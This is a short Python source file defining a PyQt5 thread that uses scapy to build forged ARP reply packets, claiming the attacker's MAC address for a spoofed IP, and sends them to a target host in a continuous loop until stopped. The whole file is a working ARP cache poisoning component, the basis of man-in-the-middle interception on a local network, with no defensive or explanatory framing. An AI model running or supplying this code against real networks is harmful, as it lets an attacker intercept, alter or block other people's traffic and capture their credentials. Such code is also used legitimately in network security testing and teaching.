#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from PyQt5 import QtCore
from scapy.all import (ARP, Ether, sendp)


class PoisonThread(QtCore.QThread):
    def __init__(self, localMac, deceiveIp, pktRecvMac, pktRecvIp,
                 parent=None):
        super().__init__(parent)
        self.localMac = localMac
        self.deceiveIp = deceiveIp
        self.pktRecvMac = pktRecvMac
        self.pktRecvIp = pktRecvIp
        self.startFlag = True

    def __del__(self):
        self.quit()
        self.wait()

    def stop(self):
        self.startFlag = False

    def run(self):
        pkt = Ether(
            src=self.localMac, dst=self.pktRecvMac) / ARP(
                hwsrc=self.localMac,
                psrc=self.deceiveIp,
                hwdst=self.pktRecvMac,
                pdst=self.pktRecvIp,
                op=2)
        while self.startFlag:
            # Every Per 0.1 second send a package
            # After 10 package(1 second) check starFlag again
            # sendp(pkt, count=10, inter=0.1)
            sendp(pkt, count=10, inter=0.3)
